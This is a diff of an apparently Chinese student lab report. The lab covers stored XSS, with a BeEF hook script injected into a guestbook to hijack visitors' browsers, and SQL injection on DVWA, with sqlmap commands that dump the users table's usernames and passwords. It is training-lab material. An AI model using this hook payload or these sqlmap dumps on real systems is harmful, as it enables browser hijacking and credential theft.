@@ -144,58 +144,58 @@
 <p>角色：留言簿网站。存在XSS漏洞；（IIS或Apache、guestbook搭建）</p>
 <p>攻击者：Kali（使用beEF生成恶意代码，并通过留言方式提交到留言簿网站）；</p>
 <p>被攻击者：访问留言簿网站，浏览器被劫持。</p>
-<h4 id="1、利用AWVS扫描留言簿网站（安装见参考文档0-AWVS安装与使用-docx），发现其存在XSS漏洞，截图。（注：如果两个人一起做的实验，一定要开桥接模式）"><a href="#1、利用AWVS扫描留言簿网站（安装见参考文档0-AWVS安装与使用-docx），发现其存在XSS漏洞，截图。（注：如果两个人一起做的实验，一定要开桥接模式）" class="headerlink" title="1、利用AWVS扫描留言簿网站（安装见参考文档0.AWVS安装与使用.docx），发现其存在XSS漏洞，截图。（注：如果两个人一起做的实验，一定要开桥接模式）"></a>1、利用AWVS扫描留言簿网站（安装见参考文档0.AWVS安装与使用.docx），发现其存在XSS漏洞，截图。（注：如果两个人一起做的实验，一定要开桥接模式）</h4><p><img src="https://raw.githubusercontent.com/xqhff/picture/main/Img/20221123-222449.png" alt="report"></p>
+<h4 id="1、利用AWVS扫描留言簿网站（安装见参考文档0-AWVS安装与使用-docx），发现其存在XSS漏洞，截图。（注：如果两个人一起做的实验，一定要开桥接模式）"><a href="#1、利用AWVS扫描留言簿网站（安装见参考文档0-AWVS安装与使用-docx），发现其存在XSS漏洞，截图。（注：如果两个人一起做的实验，一定要开桥接模式）" class="headerlink" title="1、利用AWVS扫描留言簿网站（安装见参考文档0.AWVS安装与使用.docx），发现其存在XSS漏洞，截图。（注：如果两个人一起做的实验，一定要开桥接模式）"></a>1、利用AWVS扫描留言簿网站（安装见参考文档0.AWVS安装与使用.docx），发现其存在XSS漏洞，截图。（注：如果两个人一起做的实验，一定要开桥接模式）</h4><p><img src="https://raw.githubusercontent.com/xqhff/picture/main/Img/20221124-112435.png" alt="report"></p>
 <p>扫描发现XSS漏洞</p>
 <h4 id="2、-Kali使用beef生成恶意代码，截图。"><a href="#2、-Kali使用beef生成恶意代码，截图。" class="headerlink" title="2、 Kali使用beef生成恶意代码，截图。"></a>2、 Kali使用beef生成恶意代码，截图。</h4><p>显示如下表示成功，由于我将beef-xss里的config.yaml文件里的host改成了kali的IP，所以直接打开<a target="_blank" rel="noopener" href="http://192.168.3.84:3000/ui/panel">http://192.168.3.84:3000/ui/panel</a> 即可，账号是beef，密码是打开beef-xss时改的密码</p>
-<p><img src="https://raw.githubusercontent.com/xqhff/picture/main/Img/20221123-222449-1.png" alt="生成恶意代码"></p>
+<p><img src="https://raw.githubusercontent.com/xqhff/picture/main/Img/20221124-112444.png" alt="生成恶意代码"></p>
 <p>3、访问http://留言簿网站/message.asp;将以下恶意代码写入网站留言板，</p>
 <script src="http://Kali的IP地址:3000/hook.js"></script>
 
 <p>截图。在留言板写下上述代码，显示下图即可</p>
-<p><img src="https://raw.githubusercontent.com/xqhff/picture/main/Img/20221123-222449-2.png" alt="image-20221123215435920"></p>
-<p><img src="https://raw.githubusercontent.com/xqhff/picture/main/Img/20221123-222449-3.png" alt="image-20221123215444688"></p>
+<p><img src="https://raw.githubusercontent.com/xqhff/picture/main/Img/20221124-112532.png" alt="image-20221124112519767"></p>
+<p><img src="https://raw.githubusercontent.com/xqhff/picture/main/Img/20221124-112537.png" alt="image-20221124112527301"></p>
 <h4 id="4、管理员登录login-htm，账号密码均为admin，审核用户留言。只要客户端访问这个服务器的留言板，客户端浏览器就会被劫持，指定被劫持网站为学校主页，将你在beff中的配置截图。"><a href="#4、管理员登录login-htm，账号密码均为admin，审核用户留言。只要客户端访问这个服务器的留言板，客户端浏览器就会被劫持，指定被劫持网站为学校主页，将你在beff中的配置截图。" class="headerlink" title="4、管理员登录login.htm，账号密码均为admin，审核用户留言。只要客户端访问这个服务器的留言板，客户端浏览器就会被劫持，指定被劫持网站为学校主页，将你在beff中的配置截图。"></a>4、管理员登录login.htm，账号密码均为admin，审核用户留言。只要客户端访问这个服务器的留言板，客户端浏览器就会被劫持，指定被劫持网站为学校主页，将你在beff中的配置截图。</h4><p>让其他主机访问留言板，即可在beef下看到它的IP，然后再beef的主页面选Current Browser-&gt;Commands-&gt;Browser-&gt;Hooked Domain-&gt;Redirect Browser，修改成<a target="_blank" rel="noopener" href="http://www.guet.edu.cn/">http://www.guet.edu.cn/</a> ,按下右下角的Execute就能将客户端的浏览器修改成学校主页</p>
 <p>(由于qq压缩了照片，博主也不想做三次实验，就将就了)</p>
-<p><img src="https://raw.githubusercontent.com/xqhff/picture/main/Img/20221123-222449-4.png" alt="image-20221123215238674"></p>
-<p><img src="https://raw.githubusercontent.com/xqhff/picture/main/Img/20221123-222449-5.png" alt="image-20221123215257416"></p>
-<p><img src="https://raw.githubusercontent.com/xqhff/picture/main/Img/20221123-222449-6.png" alt="image-20221123215306313"></p>
+<p><img src="https://raw.githubusercontent.com/xqhff/picture/main/Img/20221124-112624.png" alt="image-20221124112554422"></p>
+<p><img src="https://raw.githubusercontent.com/xqhff/picture/main/Img/20221124-112632.png" alt="image-20221124112603360"></p>
+<p><img src="https://raw.githubusercontent.com/xqhff/picture/main/Img/20221124-112638.png" alt="image-20221124112618645"></p>
 <h4 id="5、回答问题：实验中XSS攻击属于哪种类型？"><a href="#5、回答问题：实验中XSS攻击属于哪种类型？" class="headerlink" title="5、回答问题：实验中XSS攻击属于哪种类型？"></a>5、回答问题：实验中XSS攻击属于哪种类型？</h4><p>使用的是存储型的XSS攻击。XSS攻击：也叫持久型XSS，主要将XSS代码提交存储在服务器端（数据库，内存，文件系统等），下次请求目标页面时不用再提交XSS代码。当目标用户访问该页面获取数据时，XSS代码会从服务器解析之后加载出来，返回到浏览器做正常的HTML和JS解析执行，XSS攻击就发生了。存储型 <strong>XSS</strong> 一般出现在网站留言、评论、博客日志等交互处，恶意脚本存储到客户端或者服务端的数据库中。</p>
 <p>​                                <strong>下页还有SQL注入，请继续!</strong></p>
-<p><img src="https://raw.githubusercontent.com/xqhff/picture/main/Img/20221123-222449-7.png" alt="image-20221123215218589"></p>
+<p><img src="https://raw.githubusercontent.com/xqhff/picture/main/Img/20221124-112655.png" alt="image-20221124112650299"></p>
 <h3 id="SQL注入部分：DVWA-SQLmap-Mysql注入实战"><a href="#SQL注入部分：DVWA-SQLmap-Mysql注入实战" class="headerlink" title="SQL注入部分：DVWA+SQLmap+Mysql注入实战"></a>SQL注入部分：DVWA+SQLmap+Mysql注入实战</h3><p>实验环境搭建。启动Metasploitable2虚拟机。</p>
 <h4 id="1、注入点发现。首先肯定是要判断是否有注入漏洞。"><a href="#1、注入点发现。首先肯定是要判断是否有注入漏洞。" class="headerlink" title="1、注入点发现。首先肯定是要判断是否有注入漏洞。"></a>1、注入点发现。首先肯定是要判断是否有注入漏洞。</h4><p>在输入框输入1，返回</p>
 <p>ID: 1</p>
 <p>First name: admin</p>
 <p>Surname: admin</p>
 <p>返回正常；</p>
-<p><img src="https://raw.githubusercontent.com/xqhff/picture/main/Img/20221123-222449-8.png" alt="image-20221123215500993"></p>
+<p><img src="https://raw.githubusercontent.com/xqhff/picture/main/Img/20221124-112714.png" alt="image-20221124112706310"></p>
 <p>再次输入1’，报错，返回</p>
 <p>You have an error in your SQL syntax; check the manual that corresponds to your MariaDB server version for the right syntax to use near ‘’1’’’ at line 1</p>
 <p>此时可以断定有SQL注入漏洞，</p>
 <p><a target="_blank" rel="noopener" href="http://ip地址/DVWA-master/vulnerabilities/sqli/?id=22&amp;Submit=Submit#">http://IP地址/DVWA-master/vulnerabilities/sqli/?id=22&amp;Submit=Submit#</a></p>
 <p>下面利用SQLMap进行注入攻击。将DVWA安全级别设置为最低；</p>
 <p>按下f12在storage下找到cookie</p>
-<p><img src="https://raw.githubusercontent.com/xqhff/picture/main/Img/20221123-222449-9.png" alt="image-20221123215517876"></p>
-<h4 id="2、枚举当前使用的数据库名称和用户名。"><a href="#2、枚举当前使用的数据库名称和用户名。" class="headerlink" title="2、枚举当前使用的数据库名称和用户名。"></a>2、枚举当前使用的数据库名称和用户名。</h4><p><img src="https://raw.githubusercontent.com/xqhff/picture/main/Img/20221123-222449-10.png" alt="image-20221123215544852"></p>
+<p><img src="https://raw.githubusercontent.com/xqhff/picture/main/Img/20221124-112749.png" alt="image-20221124112731106"></p>
+<h4 id="2、枚举当前使用的数据库名称和用户名。"><a href="#2、枚举当前使用的数据库名称和用户名。" class="headerlink" title="2、枚举当前使用的数据库名称和用户名。"></a>2、枚举当前使用的数据库名称和用户名。</h4><p><img src="https://raw.githubusercontent.com/xqhff/picture/main/Img/20221124-112753.png" alt="image-20221124112742117"></p>
 <p>你输入的命令：</p>
 <pre><code>sqlmap -u &quot;http://192.168.145.129/dvwa/vulnerabilities/sqli/?id=2&amp;Submit=Submit#&quot; --cookie=&#39;security=low; PHPSESSID=90e26e583bdd1c7311d7f321af9af29e&#39; -b --current-db --current-user
 </code></pre>
 <p>Sqlmap输出截图。</p>
-<p><img src="https://raw.githubusercontent.com/xqhff/picture/main/Img/20221123-222449-11.png" alt="sql1"></p>
+<p><img src="https://raw.githubusercontent.com/xqhff/picture/main/Img/20221124-112837.png" alt="sql1"></p>
 <p>3、枚举数据库用户名和密码</p>
-<p><img src="https://raw.githubusercontent.com/xqhff/picture/main/Img/20221123-222449-12.png" alt="image-20221123215942245"></p>
+<p><img src="https://raw.githubusercontent.com/xqhff/picture/main/Img/20221124-112857.png" alt="image-20221124112850072"></p>
 <p>你输入的命令：</p>
 <pre><code>sqlmap -u &quot;http://192.168.145.129/dvwa/vulnerabilities/sqli/?id=2&amp;Submit=Submit#&quot; --cookie=&#39;security=low; PHPSESSID=90e26e583bdd1c7311d7f321af9af29e&#39; --string=&quot;Surname&quot; -D dvwa -T users -C user,password --dump
 </code></pre>
 <p>Sqlmap输出截图。</p>
-<p><img src="https://raw.githubusercontent.com/xqhff/picture/main/Img/20221123-222449-13.png" alt="sql2"></p>
+<p><img src="https://raw.githubusercontent.com/xqhff/picture/main/Img/20221124-112908.png" alt="sql2"></p>
 <p>4、枚举数据库</p>
 <p>–dbs：枚举当前数据库</p>
 <p>你输入的命令：</p>
 <pre><code>sqlmap -u &quot;http://192.168.145.129/dvwa/vulnerabilities/sqli/?id=2&amp;Submit=Submit#&quot; --cookie=&#39;security=low; PHPSESSID=90e26e583bdd1c7311d7f321af9af29e&#39; -dbs
 </code></pre>
 <p>Sqlmap输出截图。</p>
-<p><img src="https://raw.githubusercontent.com/xqhff/picture/main/Img/20221123-222449-14.png" alt="sql3"></p>
+<p><img src="https://raw.githubusercontent.com/xqhff/picture/main/Img/20221124-112943.png" alt="sql3"></p>
 <p>5、枚举数据库和指定数据库的数据表</p>
 <p> -D 数据库名：指定数据库</p>
 <p>–tables：枚举指定数据库的所有表</p>
@@ -203,7 +203,7 @@
 <pre><code>sqlmap -u &quot;http://192.168.145.129/dvwa/vulnerabilities/sqli/?id=2&amp;Submit=Submit#&quot; --cookie=&#39;security=low; PHPSESSID=90e26e583bdd1c7311d7f321af9af29e&#39; -D dvwa -tables
 </code></pre>
 <p>Sqlmap输出截图。</p>
-<p><img src="https://raw.githubusercontent.com/xqhff/picture/main/Img/20221123-222449-15.png" alt="sql4"></p>
+<p><img src="https://raw.githubusercontent.com/xqhff/picture/main/Img/20221124-112953.png" alt="sql4"></p>
 <p>6、获取指定数据库和表中所有列的信息</p>
 <p>-D：指定的数据库</p>
 <p>-T：指定数据库中的数据表</p>
@@ -212,7 +212,7 @@
 <pre><code>sqlmap -u &quot;http://192.168.145.129/dvwa/vulnerabilities/sqli/?id=2&amp;Submit=Submit#&quot; --cookie=&#39;security=low; PHPSESSID=90e26e583bdd1c7311d7f321af9af29e&#39; -D dvwa -T users -columns
 </code></pre>
 <p>Sqlmap输出截图。</p>
-<p><img src="https://raw.githubusercontent.com/xqhff/picture/main/Img/20221123-222449-16.png" alt="sql5"></p>
+<p><img src="https://raw.githubusercontent.com/xqhff/picture/main/Img/20221124-113005.png" alt="sql5"></p>
 <p>7、枚举指定数据表中的所有用户名与密码,并down到本地。</p>
 <p>-C：枚举数据表中的列</p>
 <p>–dump：存储数据表项</p>
@@ -220,9 +220,9 @@
 <pre><code>sqlmap -u &quot;http://192.168.145.129/dvwa/vulnerabilities/sqli/?id=2&amp;Submit=Submit#&quot; --cookie=&#39;security=low; PHPSESSID=90e26e583bdd1c7311d7f321af9af29e&#39; -D dvwa -T users -C user,password -dump
 </code></pre>
 <p>Sqlmap输出截图。</p>
-<p><img src="https://raw.githubusercontent.com/xqhff/picture/main/Img/20221123-222449-17.png" alt="sql6"></p>
+<p><img src="https://raw.githubusercontent.com/xqhff/picture/main/Img/20221124-113022.png" alt="sql6"></p>
 <p>查看down到本地的用户名与密码，截图。（提示带.的文件夹为隐藏，在图形命令下，用文件浏览器打开文件夹，按下ctrl+h组合键可显示隐藏文件合文件夹，再按一次取消显示。）</p>
-<p><img src="https://raw.githubusercontent.com/xqhff/picture/main/Img/20221123-222449-18.png" alt="image-20221123220419625"></p>
+<p><img src="https://raw.githubusercontent.com/xqhff/picture/main/Img/20221124-113044.png" alt="image-20221124113039638"></p>
 <h2 id="3-实验小结"><a href="#3-实验小结" class="headerlink" title="3. 实验小结"></a>3. 实验小结</h2><p>再XSS实验中，因为换了台kali而忘记开桥接模式而使得同学一直未成功。</p>
 <p>了解了存储型XSS攻击，主要将XSS代码提交存储在服务器端（数据库，内存，文件系统等），下次请求目标页面时不用再提交XSS代码。当目标用户访问该页面获取数据时，XSS代码会从服务器解析之后加载出来，返回到浏览器做正常的HTML和JS解析执行，XSS攻击就发生了。存储型 XSS 一般出现在网站留言、评论、博客日志等交互处，恶意脚本存储到客户端或者服务端的数据库中。</p>
 <p>SQL注入是一种常见的Web安全漏洞，主要形成的原因是在数据交互中，前端的数据传入到后台处理时，没有做严格的判断，导致其传入的“数据”拼接到SQL语句中后，被当作SQL语句的一部分执行。 从而导致数据库受损（被脱库、被删除、甚至整个服务器权限陷）。</p>
